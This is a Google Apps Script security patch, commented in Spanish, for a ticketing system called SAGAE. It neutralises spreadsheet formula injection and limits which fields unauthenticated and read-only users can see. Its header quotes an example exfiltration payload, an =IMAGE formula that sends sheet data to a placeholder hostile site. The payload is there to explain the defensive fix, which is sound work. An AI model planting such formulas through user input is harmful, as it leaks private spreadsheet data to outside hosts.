// ══════════════════════════════════════════════════════════════════════
// SAGAE — PARCHE DE SEGURIDAD DEL SERVIDOR (2026-10-12)
// Desarrollado por RYE Design
//
// QUÉ ARREGLA
//   1. Inyección de fórmulas: un reporte (también el anónimo del portal
//      público) con un título como =IMAGE("https://sitio-malo/?d="&...)
//      se ejecutaba como fórmula en Google Sheets y podía enviar datos de
//      la hoja a un sitio ajeno. Ahora todo texto que empiece por = + - @
//      se guarda como TEXTO.
//   2. Nombres y correos públicos: cualquiera podía pedir ?sheet=espacios
//      o ?sheet=departamentos SIN iniciar sesión y recibir los responsables
//      y sus correos. Sin sesión ahora solo salen código, nombre, depto y
//      estado (lo que usa el portal público). Con sesión todo sigue igual.
//   3. Claves de licencias: el rol consultor (solo lectura) ya no las ve.
//
// CÓMO SE INSTALA (6 pasos, en el Apps Script, archivo Código.gs)
//   Antes de empezar: Archivo → Hacer una copia (respaldo).
//   Para buscar y reemplazar: Ctrl + H (o Ctrl + F para solo buscar).
//
//   PASO 1  Busque:  function puedeLeerHoja_(rol, sheetName) {
//           Haga clic AL INICIO de esa línea, pegue el BLOQUE NUEVO de abajo
//           y presione Enter para dejar una línea en blanco.
//
//   PASO 2  Buscar:      sheet.appendRow(row);
//           Reemplazar:  sheet.appendRow(row.map(neutralizarFormula_));
//           Pulse "Reemplazar todo". Deben ser 2 reemplazos.
//
//   PASO 3  Buscar:      setValues([nuevaFila]);
//           Reemplazar:  setValues([nuevaFila.map(neutralizarFormula_)]);
//           Debe ser 1 reemplazo.
//
//   PASO 4  Busque:  const data = rows.slice(1).map(r => {
//           (aparece una sola vez). Haga clic AL INICIO de esa línea y
//           pegue ENCIMA esta línea (con su Enter):
//               const sesionLectura = validarSesion_(e.parameter.session || "");
//
//   PASO 5  Buscar:      return despojarCamposSensibles_(obj);
//           Reemplazar:  return filtrarSalidaPorRol_(sheetParam, sesionLectura, despojarCamposSensibles_(obj));
//           Debe ser 1 reemplazo.
//
//   PASO 6  Guardar (disquete) → Implementar → Administrar implementaciones →
//           lápiz → Versión: Nueva versión → Implementar.
//
// CÓMO COMPROBAR
//   a) Entre al portal y al móvil: tickets, activos, espacios y licencias
//      deben verse como siempre.
//   b) Abra el portal público de reportes: los departamentos y ubicaciones
//      deben aparecer en las listas.
//   c) Mande un reporte público de prueba con título  =1+1  y revise la hoja
//      "Tickets": la celda debe mostrar  =1+1  (texto), no  2.
//   d) Entre como consultor: en Licencias la clave debe verse vacía.
//
// SI ALGO SALE MAL: Implementar → Administrar implementaciones → lápiz →
// elija la versión anterior → Implementar. No se pierde ningún dato.
// ══════════════════════════════════════════════════════════════════════

// ───────────── BLOQUE NUEVO (para el PASO 1) ─────────────
// ══ PARCHE DE SEGURIDAD 2026-10-12 ═══════════════════════════════════
// (1) Inyección de fórmulas: un texto que empiece por = + - @ se guarda
//     como TEXTO (con comilla simple delante), nunca como fórmula de Sheets.
function neutralizarFormula_(v) {
  if (typeof v === "string" && /^[=+\-@\t\r]/.test(v)) return "'" + v;
  return v;
}

// (2) Catálogos públicos (departamentos y espacios): sin sesión solo se
//     devuelven los campos que necesita el portal público de reportes.
const CAMPOS_CATALOGO_PUBLICO = ["codigo", "nombre", "depto", "estado"];

// (2) y (3) Filtra lo que sale en una lectura según quién pregunta.
function filtrarSalidaPorRol_(hoja, sesion, obj) {
  if ((hoja === "departamentos" || hoja === "espacios") && !sesion) {
    const limpio = {};
    CAMPOS_CATALOGO_PUBLICO.forEach(function (c) { if (obj[c] !== undefined) limpio[c] = obj[c]; });
    return limpio;
  }
  // (3) La clave de las licencias no la ve el consultor (rol de solo lectura).
  if (hoja === "licencias" && sesion && sesion.rol === "consultor") obj.claveLicencia = "";
  return obj;
}
